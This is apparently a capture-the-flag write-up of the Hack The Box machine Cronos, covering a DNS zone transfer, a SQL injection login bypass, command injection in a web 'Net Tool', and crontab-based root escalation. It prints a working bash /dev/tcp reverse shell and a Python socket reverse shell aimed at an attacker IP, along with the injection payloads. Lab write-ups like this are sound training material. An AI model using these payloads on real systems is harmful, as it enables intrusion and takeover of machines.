---
title: 'Cronos'
target: 'Hack The Box — Cronos'
difficulty: 'medium'
date: 2025-08-29
summary: 'An HTB machine — enumerating DNS with a zone transfer to discover admin.cronos.htb, bypassing the login form with SQL injection (admin'' #), exploiting command injection on Net Tool v0.1 to get a reverse shell as www-data, then escalating to root through a crontab entry that runs php /var/www/laravel/artisan as root every minute — with the Laravel directory owned by www-data, replacing artisan with a PHP reverse shell grants root access.'
role: 'pentest'
tags: ['nmap', 'dns-zone-transfer', 'sql-injection', 'command-injection', 'reverse-shell', 'crontab', 'privilege-escalation', 'burp-suite', 'sqlmap', 'laravel', 'php']
problem: 'Cronos is a medium-rated Linux machine running SSH (22), DNS BIND 9.10.3 (53), and Apache 2.4.18 (80). Browsing the IP directly shows the Apache2 Ubuntu Default Page with no obvious application behind it. The machine hosts a domain (cronos.htb) with subdomains hidden behind DNS, including an admin panel vulnerable to SQL injection and a command execution tool vulnerable to injection — with a crontab-based privilege escalation path from www-data to root.'
action: 'Ran nmap with initial, full-port, and UDP scans to map the attack surface — 22/tcp (SSH), 53/tcp+udp (DNS BIND 9.10.3-P4), 80/tcp (Apache 2.4.18). Ran nmap vuln scripts finding no CSRF, XSS, or known CVEs. Performed a DNS zone transfer against cronos.htb revealing admin.cronos.htb, www.cronos.htb, and ns1.cronos.htb. Added entries to /etc/hosts. Attempted Hydra brute force against the admin login with john password list — unsuccessful. Intercepted the login POST with Burp Suite showing username=admin&password=bla. Bypassed authentication with SQL injection (admin'' #). Confirmed the injection with sqlmap which found an ORDER BY payload triggering a 302 redirect to welcome.php. On the admin panel, found Net Tool v0.1 with traceroute/ping commands. Attempted bash reverse shell via pipe injection in the host parameter — confirmed bash exists at /bin/bash via which+bash command injection. The bash shell did not connect, so pivoted to a Python reverse shell using socket/subprocess, which delivered a shell as www-data. Discovered a crontab entry running php /var/www/laravel/artisan schedule:run as root every minute. Confirmed /var/www/laravel/ is owned by www-data, meaning the artisan file can be replaced. Ran Linux Exploit Suggester showing kernel 4.4.0 vulnerable to af_packet (CVE-2016-8655), dirty_cow (CVE-2016-5195), exploit_x (CVE-2018-14665), and get_rekt (CVE-2017-16695). Used the crontab path — replaced artisan with a PHP reverse shell to get root.'
outcome: 'Gained root access to the machine. The attack chain was DNS zone transfer for subdomain discovery, SQL injection for authentication bypass on admin.cronos.htb, command injection on Net Tool v0.1 for initial shell as www-data, and crontab abuse replacing a root-executed artisan file for privilege escalation.'
draft: false
---

## Background

Cronos is a medium-rated Linux box that chains together several common vulnerabilities into a clean attack path. The machine hides its real application behind DNS — browsing the IP address shows nothing but the Apache default page, and without a zone transfer to discover the subdomains, there's no obvious entry point. From there, the path moves through SQL injection on an admin login, command injection on a network tool, and a crontab misconfiguration where root runs a file owned by an unprivileged user. Each step is individually straightforward, but the box teaches an important lesson about how DNS enumeration can be the difference between having an attack surface and having nothing.

---

## Port scanning

The initial nmap scan with default scripts and version detection reveals three open ports on 10.10.10.13.

![Kali terminal running nmap -sC -sV -O -oA initial 10.10.10.13 showing three open ports — 22/tcp SSH OpenSSH 7.2p2 Ubuntu, 53/tcp DNS ISC BIND 9.10.3-P4, 80/tcp HTTP Apache 2.4.18 with title Apache2 Ubuntu Default Page, OS guesses Linux 3.10 through 4.8.](/writeups/htb-cronos/01-nmap-initial.png)

Port 22 running OpenSSH 7.2p2, port 53 running ISC BIND 9.10.3-P4, and port 80 running Apache 2.4.18. The presence of DNS on port 53 is immediately interesting — it means this machine is acting as a DNS server, which opens up zone transfer possibilities.

A full port scan confirms there are no additional services hiding on higher ports.

![Kali terminal running nmap -sC -sV -O -p- -oA full 10.10.10.13 showing the same three ports — 22/tcp SSH, 53/tcp DNS, 80/tcp HTTP — with 65532 filtered ports and scan completed in 170.03 seconds.](/writeups/htb-cronos/02-nmap-full.png)

A UDP scan confirms port 53 is also open on UDP, which is expected for a DNS server and necessary for zone transfers.

![Kali terminal running nmap -sU -oA udp-1000 10.10.10.13 showing 997 open or filtered ports, 22/udp closed ssh, 53/udp open domain, 80/udp closed http, scan completed in 7.29 seconds.](/writeups/htb-cronos/03-nmap-udp.png)

---

## Web enumeration — the dead end

Browsing to `http://10.10.10.13` directly shows the Apache2 Ubuntu Default Page — the generic "It works!" page that ships with Apache on Ubuntu. There is no custom application, no links, no login form. This is a common pattern on HTB machines where the web application is hosted on a virtual host that requires the correct hostname to resolve.

![Firefox browser showing the Apache2 Ubuntu Default Page at 10.10.10.13 with the standard It works heading, Configuration Overview section, and the Ubuntu logo.](/writeups/htb-cronos/04-apache-default.png)

Running nmap's vulnerability scripts against the target comes back clean — no CSRF, no DOM-based or stored XSS, and two CVE checks fail to execute. The IP-based web server is a dead end.

![Kali terminal running nmap --script vuln 10.10.10.13 showing ports 22, 53, and 80 open, with http-csrf finding no CSRF vulnerabilities, http-dombased-xss finding no DOM based XSS, http-stored-xss finding no stored XSS, and http-vuln-cve2014-3704 and http-vuln-wnr1000-creds both returning script execution failed errors. Scan completed in 328.12 seconds.](/writeups/htb-cronos/05-nmap-vuln.png)

---

## DNS zone transfer

With port 53 open and an apparent virtual host setup, the next step is DNS enumeration. A DNS zone transfer against `cronos.htb` pulls the full zone file from the server.

```bash
host -l cronos.htb 10.10.10.13
```

![Kali terminal showing host -l cronos.htb 10.10.10.13 returning the zone transfer results — cronos.htb name server ns1.cronos.htb, cronos.htb has address 10.10.10.13, admin.cronos.htb has address 10.10.10.13, ns1.cronos.htb has address 10.10.10.13, www.cronos.htb has address 10.10.10.13.](/writeups/htb-cronos/06-dns-zone-transfer.png)

The zone transfer reveals four subdomains: `cronos.htb`, `admin.cronos.htb`, `www.cronos.htb`, and `ns1.cronos.htb`. The `admin` subdomain is the obvious next target. Adding all of them to `/etc/hosts` and browsing to `http://admin.cronos.htb` presents a login form.

---

## SQL injection — authentication bypass

The admin login form at `http://admin.cronos.htb` presents a username and password field. Before trying manual injection, a brute force attempt with Hydra using john's password list is worth a shot to see if the credentials are weak.

![Kali terminal running locate password pipe grep john showing paths to john password lists including /usr/share/john/password.lst and /usr/share/commix/src/txt/passwords_john.txt.](/writeups/htb-cronos/07-locate-john.png)

Hydra doesn't find valid credentials. Intercepting the login POST request with Burp Suite shows the parameters being sent — `username=admin&password=bla` — in a standard URL-encoded form submission.

![Burp Suite Intercept tab showing a POST request to http://admin.cronos.htb:80 with headers including User-Agent Mozilla/5.0 Firefox/52.0, Cookie PHPSESSID=cokt9vtlusqogp4i3ph1drkmo0, Content-Type application/x-www-form-urlencoded, and body username=admin&password=bla.](/writeups/htb-cronos/08-burp-login.png)

The login form is vulnerable to SQL injection. Entering `admin' #` in the username field bypasses authentication entirely — the single quote breaks out of the SQL query, and the `#` comments out the rest of the statement including the password check. This is a classic authentication bypass where the query becomes something like `SELECT * FROM users WHERE username='admin' #' AND password='...'`, effectively ignoring the password entirely.

Confirming the injection with sqlmap shows it finding an `ORDER BY` payload — `admin' ORDER BY 1-- CKDl` — and detecting a 302 redirect to `welcome.php`, which is the authenticated admin dashboard.

![Terminal showing sqlmap payload admin single-quote ORDER BY 1 dash-dash CKDl with the HTTP request showing POST to /index.php on admin.cronos.htb, the URL-encoded body with username containing the ORDER BY payload and password=admin, and sqlmap detecting a 302 redirect to http://admin.cronos.htb:80/welcome.php and asking whether to follow.](/writeups/htb-cronos/09-sqlmap-redirect.png)

---

## Command injection — initial shell

The admin dashboard (`welcome.php`) contains **Net Tool v0.1** — a web interface with a dropdown to select either `traceroute` or `ping` and a text field for the target host. The form submits a POST request with `command=traceroute&host=<input>`. The host parameter is passed directly to a shell command without sanitisation.

The first attempt is a bash reverse shell injected via pipe in the host parameter. The payload in Burp shows `command=traceroute&host=8.8.8.8+|+bash+-i+>%26+/dev/tcp/10.10.14.6/4444+0>%261` — a URL-encoded bash reverse shell appended to the traceroute command.

![Burp Suite Request panel showing POST to /welcome.php on admin.cronos.htb with the command injection payload in the body — command=traceroute&host=8.8.8.8 pipe bash -i redirect /dev/tcp/10.10.14.6/4444.](/writeups/htb-cronos/10-burp-bash-rce.png)

Before assuming bash is available, verifying with `which+bash` confirms it exists at `/bin/bash`. The response also reveals the full HTML of the Net Tool page — a simple form with traceroute and ping options and a text input for the host.

![Burp Suite split view showing the Request with command=traceroute&host=8.8.8.8 pipe which+bash and the Response with Content-Type text/html showing Net Tool v0.1 HTML source with form elements, and the command output showing /bin/bash confirming bash is present on the system.](/writeups/htb-cronos/11-burp-which-bash.png)

The bash reverse shell didn't connect back — likely due to how the redirections are handled in the command context. Pivoting to a Python reverse shell, which is more reliable in these situations. The payload uses Python's `socket`, `subprocess`, and `os` modules to create a socket connection back to the attacker, duplicate the file descriptors, and spawn an interactive shell.

![Burp Suite split view showing the Request with command=traceroute&host=8.8.8.8 pipe python -c import socket subprocess os with the full Python reverse shell payload URL-encoded in the body, Content-Length 278.](/writeups/htb-cronos/12-burp-python-shell.png)

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

The Python reverse shell connects back and delivers a shell as `www-data`.

---

## Privilege escalation — crontab and artisan

With a shell as www-data, checking the crontab reveals an entry that runs every minute as root.

![Terminal showing crontab contents with the system-wide crontab header, standard cron entries for hourly/daily/weekly/monthly, and the critical line — asterisk asterisk asterisk asterisk asterisk root php /var/www/laravel/artisan schedule:run redirect to /dev/null.](/writeups/htb-cronos/13-crontab.png)

```
* * * * *   root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

This line runs `php /var/www/laravel/artisan` as root every single minute. The question is whether www-data can write to that file. Checking the permissions on the Laravel directory confirms that the entire directory — including `artisan` — is owned by `www-data`.

![Terminal running ls -la /var/www/laravel/ as www-data showing the directory contents — all files and directories owned by www-data:www-data, including artisan (1646 bytes), .env, .git, .gitattributes, .gitignore, CHANGELOG.md, app, bootstrap, composer.json, and composer.lock.](/writeups/htb-cronos/14-laravel-permissions.png)

The `artisan` file is owned by `www-data` and the directory is writable. This means www-data can replace `artisan` with anything — and root will execute it within 60 seconds. Replacing it with a PHP reverse shell that connects back to the attacker on a different port and waiting for the cron job to fire grants a root shell.

As an alternative path, running the Linux Exploit Suggester on the box reveals that the kernel version (4.4.0) is vulnerable to several local privilege escalation exploits.

![Terminal running linux-exploit-suggester-2.pl showing Local Kernel 4.4.0, searching 72 exploits, and listing four possible exploits — af_packet CVE-2016-8655, dirty_cow CVE-2016-5195, exploit_x CVE-2018-14665, and get_rekt CVE-2017-16695 with exploit-db source links for each.](/writeups/htb-cronos/15-exploit-suggester.png)

Dirty Cow (CVE-2016-5195) and af_packet (CVE-2016-8655) are both reliable kernel exploits for this version, but the crontab path is cleaner and doesn't risk crashing the system. The flags were retrieved from both user and root home directories.

---

## What I took from this

The biggest takeaway from Cronos is how much attack surface can be hidden behind DNS. Browsing the IP address gives nothing — just a default Apache page. Without the zone transfer revealing `admin.cronos.htb`, there's no login form to inject, no command tool to exploit, and no path forward. In a real engagement, this is why DNS enumeration (zone transfers, subdomain brute forcing, reverse lookups) is one of the first things to run — misconfigured DNS servers that allow zone transfers are still surprisingly common, and they hand over the full map of what's hosted on a target.

The crontab privilege escalation is a textbook example of a file ownership problem. The cron job runs as root, but the file it executes is owned by www-data. This is a common misconfiguration in Laravel deployments where the web server user needs write access to parts of the application directory for caching and logging, and the artisan file ends up with the same ownership. The fix is straightforward — artisan should be owned by root with read-only permissions for other users, or the cron job should run as a non-root user. The fact that the cron runs every minute with full root privileges and no integrity check on the file it executes makes this a trivial escalation once you have write access to the directory.

The command injection on Net Tool v0.1 is another reminder that web interfaces wrapping system commands need rigorous input sanitisation. The application takes user input and passes it directly to `traceroute` or `ping` via a shell — any pipe, semicolon, or backtick in the input breaks out of the intended command and executes arbitrary code. The bash reverse shell failing but the Python one succeeding is a common pattern — bash's redirection syntax doesn't always survive URL encoding and command-line parsing cleanly, while Python's socket-based approach is self-contained and more portable across different shell contexts.
